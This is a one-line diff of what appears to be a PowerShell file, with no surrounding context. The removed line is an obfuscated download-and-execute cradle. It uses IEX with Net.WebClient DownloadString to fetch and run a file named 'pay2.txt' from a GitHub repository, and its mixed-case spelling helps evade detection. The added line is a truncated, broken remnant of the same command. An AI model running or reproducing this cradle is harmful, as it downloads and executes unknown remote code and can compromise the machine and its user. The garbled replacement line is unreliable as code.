@@ -1,1 +1,1 @@
-IEX(NEw-OBjEcT NET.webClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay2.txt');
+BjEcT NET.webClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay2.txt');
